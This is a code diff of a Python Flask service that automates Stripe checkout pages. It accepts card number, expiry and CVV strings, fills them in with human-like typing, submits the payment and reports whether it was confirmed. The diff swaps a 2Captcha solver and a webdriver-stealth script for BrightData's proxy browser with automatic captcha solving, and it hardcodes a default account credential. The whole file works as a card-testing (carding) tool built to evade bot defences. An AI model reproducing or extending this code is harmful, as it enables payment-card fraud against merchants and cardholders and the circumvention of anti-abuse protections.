@@ -1,216 +1,33 @@
+#!/usr/bin/env python3
 import os
 import asyncio
 import json
 import random
 import re
 import time
-import base64
 from datetime import datetime
 from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout
-from playwright._impl._errors import TargetClosedError
 from flask import Flask, request, jsonify
 from dotenv import load_dotenv
 from collections import deque
-import httpx
 
 load_dotenv()
 
 CONFIG = {
     "RUN_LOCAL": os.getenv('RUN_LOCAL', 'false').lower() == 'true',
-    "BROWSERLESS_API_KEY": os.getenv('BROWSERLESS_API_KEY'),
-    "TWOCAPTCHA_API_KEY": os.getenv('TWOCAPTCHA_API_KEY'),  # Add this to your .env
+    "BRIGHTDATA_AUTH": os.getenv('BRIGHTDATA_AUTH', 'brd-customer-hl_9e99ef01-zone-scraping_browser1:b8nk1xz9a83f'),
     "RESPONSE_TIMEOUT_SECONDS": 50,
     "RETRY_DELAY": 2000,
     "RATE_LIMIT_REQUESTS": 5,
     "RATE_LIMIT_WINDOW": 60,
     "MAX_RETRIES": 2,
-    "BROWSERLESS_TIMEOUT": 60000,
-    "CAPTCHA_TIMEOUT": 120  # 2 minutes for captcha solving
+    "BROWSER_TIMEOUT": 120000,
+    "CAPTCHA_DETECT_TIMEOUT": 10000,
+    "CAPTCHA_SOLVE_TIMEOUT": 30000
 }
 
 app = Flask(__name__)
 request_timestamps = deque(maxlen=CONFIG["RATE_LIMIT_REQUESTS"])
-
-# 2Captcha solver class
-class TwoCaptchaSolver:
-    def __init__(self, api_key):
-        self.api_key = api_key
-        self.base_url = "http://2captcha.com"
-        
-    async def solve_hcaptcha(self, sitekey, page_url):
-        """Solve HCaptcha using 2captcha service"""
-        if not self.api_key:
-            print("[CAPTCHA] No 2captcha API key configured")
-            return None
-            
-        print(f"[CAPTCHA] Submitting HCaptcha to 2captcha...")
-        print(f"[CAPTCHA] Sitekey: {sitekey[:20]}...")
-        print(f"[CAPTCHA] URL: {page_url[:50]}...")
-        
-        try:
-            async with httpx.AsyncClient() as client:
-                # Submit captcha
-                submit_data = {
-                    'key': self.api_key,
-                    'method': 'hcaptcha',
-                    'sitekey': sitekey,
-                    'pageurl': page_url,
-                    'json': 1
-                }
-                
-                response = await client.post(f"{self.base_url}/in.php", data=submit_data)
-                result = response.json()
-                
-                if result.get('status') != 1:
-                    print(f"[CAPTCHA] Submit failed: {result.get('error_text', 'Unknown error')}")
-                    return None
-                
-                captcha_id = result.get('request')
-                print(f"[CAPTCHA] Task ID: {captcha_id}")
-                
-                # Poll for result
-                start_time = time.time()
-                while time.time() - start_time < CONFIG["CAPTCHA_TIMEOUT"]:
-                    await asyncio.sleep(5)
-                    
-                    check_url = f"{self.base_url}/res.php?key={self.api_key}&action=get&id={captcha_id}&json=1"
-                    response = await client.get(check_url)
-                    result = response.json()
-                    
-                    if result.get('status') == 1:
-                        token = result.get('request')
-                        print(f"[CAPTCHA] ✓ Solved! Token: {token[:30]}...")
-                        return token
-                    elif result.get('request') == 'CAPCHA_NOT_READY':
-                        elapsed = int(time.time() - start_time)
-                        print(f"[CAPTCHA] Solving... ({elapsed}s)")
-                        continue
-                    else:
-                        print(f"[CAPTCHA] Error: {result.get('error_text', 'Unknown')}")
-                        return None
-                
-                print("[CAPTCHA] Timeout waiting for solution")
-                return None
-                
-        except Exception as e:
-            print(f"[CAPTCHA] Error: {e}")
-            return None
-
-# Enhanced captcha detection and handling
-class CaptchaHandler:
-    @staticmethod
-    async def detect_hcaptcha(page):
-        """Detect HCaptcha on the page"""
-        try:
-            # Check for HCaptcha iframe
-            hcaptcha_frame = await page.query_selector('iframe[src*="hcaptcha.com"]')
-            if hcaptcha_frame:
-                print("[CAPTCHA] HCaptcha iframe detected")
-                return True
-                
-            # Check for HCaptcha div
-            hcaptcha_div = await page.query_selector('div[data-hcaptcha-widget-id]')
-            if hcaptcha_div:
-                print("[CAPTCHA] HCaptcha widget detected")
-                return True
-                
-            # Check for h-captcha class
-            hcaptcha_element = await page.query_selector('.h-captcha')
-            if hcaptcha_element:
-                print("[CAPTCHA] HCaptcha element detected")
-                return True
-                
-            return False
-            
-        except Exception as e:
-            print(f"[CAPTCHA] Detection error: {e}")
-            return False
-    
-    @staticmethod
-    async def get_hcaptcha_sitekey(page):
-        """Extract HCaptcha sitekey from the page"""
-        try:
-            # Method 1: From data-sitekey attribute
-            element = await page.query_selector('[data-sitekey]')
-            if element:
-                sitekey = await element.get_attribute('data-sitekey')
-                if sitekey:
-                    return sitekey
-            
-            # Method 2: From iframe src
-            iframe = await page.query_selector('iframe[src*="hcaptcha.com"]')
-            if iframe:
-                src = await iframe.get_attribute('src')
-                match = re.search(r'sitekey=([a-zA-Z0-9-]+)', src)
-                if match:
-                    return match.group(1)
-            
-            # Method 3: From script content
-            scripts = await page.query_selector_all('script')
-            for script in scripts:
-                content = await script.inner_text()
-                match = re.search(r'["\']sitekey["\']\s*:\s*["\']([a-zA-Z0-9-]+)["\']', content)
-                if match:
-                    return match.group(1)
-                    
-            print("[CAPTCHA] Could not find sitekey")
-            return None
-            
-        except Exception as e:
-            print(f"[CAPTCHA] Sitekey extraction error: {e}")
-            return None
-    
-    @staticmethod
-    async def inject_captcha_token(page, token):
-        """Inject the solved captcha token into the page"""
-        try:
-            # Method 1: Set h-captcha-response
-            await page.evaluate(f'''
-                () => {{
-                    const responseField = document.querySelector('[name="h-captcha-response"]');
-                    if (responseField) {{
-                        responseField.value = '{token}';
-                        responseField.innerHTML = '{token}';
-                    }}
-                    
-                    const gResponseField = document.querySelector('[name="g-recaptcha-response"]');
-                    if (gResponseField) {{
-                        gResponseField.value = '{token}';
-                        gResponseField.innerHTML = '{token}';
-                    }}
-                    
-                    // Try to trigger callback
-                    if (typeof hcaptcha !== 'undefined' && hcaptcha.execute) {{
-                        window.hcaptcha.execute();
-                    }}
-                    
-                    // Trigger any callback functions
-                    if (window.hcaptchaCallback) {{
-                        window.hcaptchaCallback('{token}');
-                    }}
-                    
-                    if (window.onHcaptchaCallback) {{
-                        window.onHcaptchaCallback('{token}');
-                    }}
-                }}
-            ''')
-            
-            # Method 2: Dispatch event
-            await page.evaluate(f'''
-                () => {{
-                    const event = new CustomEvent('hcaptcha-verified', {{
-                        detail: {{ response: '{token}' }}
-                    }});
-                    document.dispatchEvent(event);
-                }}
-            ''')
-            
-            print("[CAPTCHA] ✓ Token injected")
-            return True
-            
-        except Exception as e:
-            print(f"[CAPTCHA] Injection error: {e}")
-            return False
 
 def rate_limit_check():
     now = time.time()
@@ -402,6 +219,46 @@ async def safe_wait(page, ms):
     except:
         return False
 
+async def handle_captcha_with_cdp(client, page, timeout=CONFIG["CAPTCHA_SOLVE_TIMEOUT"]):
+    """Handle captcha automatically using BrightData's CDP API"""
+    try:
+        print("[CAPTCHA] Checking for captcha...")
+        
+        # Use CDP to wait for and solve captcha
+        result = await asyncio.wait_for(
+            asyncio.create_task(
+                asyncio.to_thread(
+                    client.send, 
+                    'Captcha.waitForSolve',
+                    {
+                        'detectTimeout': CONFIG["CAPTCHA_DETECT_TIMEOUT"],
+                        'solveTimeout': timeout * 1000  # Convert to milliseconds
+                    }
+                )
+            ),
+            timeout=timeout + 5  # Add buffer to timeout
+        )
+        
+        status = result.get('status', 'unknown')
+        print(f"[CAPTCHA] Status: {status}")
+        
+        if status == 'solved':
+            print("[CAPTCHA] ✓ Successfully solved")
+            return True
+        elif status == 'detected':
+            print("[CAPTCHA] Detected but not solved")
+            return False
+        else:
+            print("[CAPTCHA] Not detected")
+            return True  # No captcha to solve
+            
+    except asyncio.TimeoutError:
+        print("[CAPTCHA] Timeout waiting for solution")
+        return False
+    except Exception as e:
+        print(f"[CAPTCHA] Error: {e}")
+        return False
+
 async def run_stripe_automation(url, cc_string, email=None):
     card = process_card_input(cc_string)
     if not card:
@@ -429,8 +286,6 @@ async def run_stripe_automation(url, cc_string, email=None):
     }
     
     analyzer = StripeResponseAnalyzer()
-    captcha_handler = CaptchaHandler()
-    captcha_solver = TwoCaptchaSolver(CONFIG.get("TWOCAPTCHA_API_KEY"))
     
     async with async_playwright() as p:
         browser = None
@@ -442,35 +297,35 @@ async def run_stripe_automation(url, cc_string, email=None):
             # Connect to browser
             if CONFIG["RUN_LOCAL"]:
                 browser = await p.chromium.launch(headless=False, slow_mo=100)
-                print("[BROWSER] Local")
+                print("[BROWSER] Local mode")
             else:
-                print("[BROWSER] Connecting to Browserless...")
-                browser_url = f"wss://production-sfo.browserless.io/chromium/playwright?token={CONFIG['BROWSERLESS_API_KEY']}&timeout={CONFIG['BROWSERLESS_TIMEOUT']}"
+                # Use BrightData's scraping browser
+                auth = CONFIG["BRIGHTDATA_AUTH"]
+                if auth == 'brd-customer-hl_9e99ef01-zone-scraping_browser1:b8nk1xz9a83f':
+                    print("[WARNING] Using default BrightData credentials. Update BRIGHTDATA_AUTH in .env")
+                
+                endpoint_url = f'wss://{auth}@brd.superproxy.io:9222'
+                print(f"[BROWSER] Connecting to BrightData...")
+                
                 try:
-                    browser = await p.chromium.connect(browser_url, timeout=30000)
-                    print("[BROWSER] ✓ Connected")
+                    browser = await p.chromium.connect_over_cdp(endpoint_url, timeout=30000)
+                    print("[BROWSER] ✓ Connected to BrightData")
                 except Exception as e:
-                    print(f"[BROWSER] Failed: {e}")
+                    print(f"[BROWSER] BrightData connection failed: {e}")
+                    print("[BROWSER] Falling back to local browser")
                     browser = await p.chromium.launch(headless=True)
             
-            context = await browser.new_context(
-                viewport={'width': 1920, 'height': 1080},
-                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
-                locale='en-US',
-                timezone_id='America/New_York'
-            )
+            # Create page
+            page = await browser.new_page()
             
-            # Add stealth scripts
-            await context.add_init_script("""
-                Object.defineProperty(navigator, 'webdriver', {
-                    get: () => false,
-                });
-                Object.defineProperty(navigator, 'plugins', {
-                    get: () => [1, 2, 3, 4, 5],
-                });
-            """)
-            
-            page = await context.new_page()
+            # Get CDP client for captcha handling
+            client = None
+            if not CONFIG["RUN_LOCAL"]:
+                try:
+                    client = await page.context.new_cdp_session(page)
+                    print("[CDP] Session created")
+                except Exception as e:
+                    print(f"[CDP] Failed to create session: {e}")
             
             # Response capture
             async def capture_response(response):
@@ -493,30 +348,17 @@ async def run_stripe_automation(url, cc_string, email=None):
             
             # Navigate
             print("[NAV] Loading...")
-            await page.goto(url, wait_until="domcontentloaded", timeout=40000)
+            await page.goto(url, wait_until="domcontentloaded", timeout=60000)
             print("[NAV] ✓ Loaded")
             
             await safe_wait(page, 3000)
             
-            # Check for HCaptcha BEFORE filling anything
-            has_captcha = await captcha_handler.detect_hcaptcha(page)
-            if has_captcha:
-                print("[CAPTCHA] HCaptcha detected on page")
-                sitekey = await captcha_handler.get_hcaptcha_sitekey(page)
-                
-                if sitekey and CONFIG.get("TWOCAPTCHA_API_KEY"):
-                    print(f"[CAPTCHA] Sitekey found: {sitekey}")
-                    token = await captcha_solver.solve_hcaptcha(sitekey, page.url)
-                    
-                    if token:
-                        await captcha_handler.inject_captcha_token(page, token)
-                        stripe_result["captcha_solved"] = True
-                        await safe_wait(page, 2000)
-                        print("[CAPTCHA] ✓ Solved and injected")
-                    else:
-                        print("[CAPTCHA] Failed to solve")
-                else:
-                    print("[CAPTCHA] Cannot solve - missing sitekey or API key")
+            # Handle initial captcha if present
+            if client:
+                captcha_solved = await handle_captcha_with_cdp(client, page)
+                if captcha_solved:
+                    stripe_result["captcha_solved"] = True
+                    await safe_wait(page, 2000)
             
             # Fill email
             print("[FILL] Email...")
@@ -533,7 +375,7 @@ async def run_stripe_automation(url, cc_string, email=None):
                     for element in elements:
                         if await element.is_visible():
                             await element.click()
-                            await element.fill("")  # Clear first
+                            await element.fill("")
                             await element.type(email, delay=50)
                             email_filled = True
                             print(f"[EMAIL] ✓ {email}")
@@ -545,7 +387,7 @@ async def run_stripe_automation(url, cc_string, email=None):
             
             await safe_wait(page, 1500)
             
-            # Enhanced card filling with better frame detection
+            # Fill card details
             print("[FILL] Card details...")
             filled_status = {"card": False, "expiry": False, "cvc": False, "name": False}
             
@@ -575,7 +417,7 @@ async def run_stripe_automation(url, cc_string, email=None):
             stripe_frames = [f for f in frames if 'stripe' in f.url.lower()]
             print(f"[FRAMES] {len(stripe_frames)} Stripe frames found")
             
-            # Try multiple times to fill card details
+            # Fill card fields in frames
             for attempt in range(3):
                 if all([filled_status["card"], filled_status["expiry"], filled_status["cvc"]]):
                     break
@@ -584,7 +426,6 @@ async def run_stripe_automation(url, cc_string, email=None):
                 
                 for frame in stripe_frames:
                     try:
-                        # Wait for frame to be ready
                         await frame.wait_for_load_state('domcontentloaded', timeout=5000)
                         
                         # Card number
@@ -593,15 +434,14 @@ async def run_stripe_automation(url, cc_string, email=None):
                                 'input[placeholder*="1234" i]',
                                 'input[placeholder*="card number" i]',
                                 'input[name="cardnumber"]',
-                                'input[autocomplete="cc-number"]',
-                                'input[aria-label*="card" i]'
+                                'input[autocomplete="cc-number"]'
                             ]
                             for selector in card_selectors:
                                 try:
                                     element = await frame.query_selector(selector)
                                     if element and await element.is_visible():
                                         await element.click()
-                                        await element.fill("")  # Clear first
+                                        await element.fill("")
                                         for digit in card['number']:
                                             await element.type(digit, delay=random.randint(30, 80))
                                         filled_status["card"] = True
@@ -656,7 +496,7 @@ async def run_stripe_automation(url, cc_string, email=None):
                                 except:
                                     continue
                     except Exception as e:
-                        print(f"[FRAME] Error in frame {frame.url[:50]}: {e}")
+                        print(f"[FRAME] Error in frame: {e}")
                         continue
                 
                 if not all([filled_status["card"], filled_status["expiry"], filled_status["cvc"]]):
@@ -667,18 +507,9 @@ async def run_stripe_automation(url, cc_string, email=None):
             # Wait for validation
             await safe_wait(page, 3000)
             
-            # Check for captcha again before submit
-            has_captcha_after = await captcha_handler.detect_hcaptcha(page)
-            if has_captcha_after and not stripe_result["captcha_solved"]:
-                print("[CAPTCHA] HCaptcha appeared after filling")
-                sitekey = await captcha_handler.get_hcaptcha_sitekey(page)
-                
-                if sitekey and CONFIG.get("TWOCAPTCHA_API_KEY"):
-                    token = await captcha_solver.solve_hcaptcha(sitekey, page.url)
-                    if token:
-                        await captcha_handler.inject_captcha_token(page, token)
-                        stripe_result["captcha_solved"] = True
-                        await safe_wait(page, 2000)
+            # Check for captcha before submit
+            if client:
+                await handle_captcha_with_cdp(client, page, timeout=20)
             
             # Submit payment
             print("[SUBMIT] Looking for submit button...")
@@ -687,15 +518,13 @@ async def run_stripe_automation(url, cc_string, email=None):
                 'button.SubmitButton:visible',
                 'button:has-text("pay"):visible',
                 'button:has-text("submit"):visible',
-                'button:has-text("complete"):visible',
-                'button.btn-primary:visible'
+                'button:has-text("complete"):visible'
             ]
             
             for selector in submit_selectors:
                 try:
                     btn = page.locator(selector).first
                     if await btn.count() > 0:
-                        # Check if button is enabled
                         is_disabled = await btn.get_attribute('disabled')
                         if is_disabled is None or is_disabled == 'false':
                             await btn.click()
@@ -706,28 +535,26 @@ async def run_stripe_automation(url, cc_string, email=None):
                     continue
             
             if not payment_submitted:
-                # Try pressing Enter as fallback
                 await page.keyboard.press('Enter')
                 payment_submitted = True
                 print("[SUBMIT] ✓ Enter key pressed")
             
-            # Wait for payment processing
-            print("[WAIT] Processing payment (15s)...")
-            await safe_wait(page, 15000)
+            # Wait for payment processing with captcha check
+            print("[WAIT] Processing payment...")
+            await safe_wait(page, 5000)
+            
+            # Check for captcha after submit
+            if client:
+                await handle_captcha_with_cdp(client, page, timeout=30)
+                await safe_wait(page, 2000)
             
             # Monitor for response
             print("[MONITORING] Waiting for confirmation...")
             start_time = time.time()
             max_wait = CONFIG["RESPONSE_TIMEOUT_SECONDS"]
-            last_response_count = 0
             
             while time.time() - start_time < max_wait:
                 elapsed = time.time() - start_time
-                
-                current_responses = len(stripe_result['raw_responses'])
-                if current_responses > last_response_count:
-                    print(f"[MONITOR] {current_responses} responses captured")
-                    last_response_count = current_responses
                 
                 if stripe_result.get("payment_confirmed"):
                     print("[✓✓✓ SUCCESS] Payment confirmed!")
@@ -759,14 +586,6 @@ async def run_stripe_automation(url, cc_string, email=None):
                         break
                 except:
                     pass
-                
-                # Keep page alive
-                if int(elapsed) % 5 == 0 and int(elapsed) > 0:
-                    try:
-                        await page.evaluate('1')
-                    except:
-                        print("[WARNING] Browser disconnected")
-                        break
                 
                 await asyncio.sleep(0.5)
             
@@ -805,7 +624,7 @@ async def run_stripe_automation(url, cc_string, email=None):
             else:
                 return {
                     "success": False,
-                    "message": "Payment not confirmed - check raw responses",
+                    "message": "Payment not confirmed",
                     "card": f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}",
                     "details": {
                         "filled": filled_status,
@@ -830,11 +649,6 @@ async def run_stripe_automation(url, cc_string, email=None):
                     await page.close()
                 except:
                     pass
-            if context:
-                try:
-                    await context.close()
-                except:
-                    pass
             if browser:
                 try:
                     await browser.close()
@@ -854,7 +668,7 @@ def stripe_endpoint():
     
     print(f"\n{'='*80}")
     print(f"[REQUEST] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-    print(f"[URL] {url[:100]}...")
+    print(f"[URL] {url[:100]}..." if url else "[URL] None")
     print(f"[CC] {cc}")
     print('='*80)
     
@@ -878,11 +692,12 @@ def stripe_endpoint():
 def status_endpoint():
     return jsonify({
         "status": "online",
-        "version": "3.0-captcha-support",
+        "version": "4.0-brightdata",
         "features": {
-            "hcaptcha": True,
-            "2captcha": bool(CONFIG.get("TWOCAPTCHA_API_KEY")),
-            "auto_retry": True
+            "captcha_solver": "BrightData CDP",
+            "auto_captcha": True,
+            "proxy_support": True,
+            "location_change": True
         },
         "timestamp": datetime.now().isoformat()
     })
@@ -890,8 +705,9 @@ def status_endpoint():
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5001))
     print("="*80)
-    print("[SERVER] Stripe Automation v3.0 - HCaptcha Support")
+    print("[SERVER] Stripe Automation v4.0 - BrightData Integration")
     print(f"[PORT] {port}")
-    print(f"[2CAPTCHA] {'Enabled' if CONFIG.get('TWOCAPTCHA_API_KEY') else 'Disabled'}")
+    print(f"[CAPTCHA] BrightData Auto-Solve Enabled")
+    print(f"[MODE] {'Local' if CONFIG['RUN_LOCAL'] else 'BrightData Cloud'}")
     print("="*80)
     app.run(host='0.0.0.0', port=port, debug=False)
